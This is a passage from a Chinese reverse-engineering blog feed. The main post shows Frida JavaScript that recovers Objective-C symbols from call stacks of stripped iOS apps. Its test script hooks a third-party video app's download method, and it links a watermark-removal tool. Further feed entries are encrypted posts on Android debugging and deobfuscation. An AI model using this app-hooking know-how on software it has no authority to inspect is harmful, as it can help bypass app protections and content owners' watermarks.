以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>android调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-08-01T07:52:05.503Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
      <category term="debug" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"/>
    
  </entry>
  
  <entry>
    <title>Android AutoJS 脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-07-30T07:55:01.711Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="AutoJS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/AutoJS/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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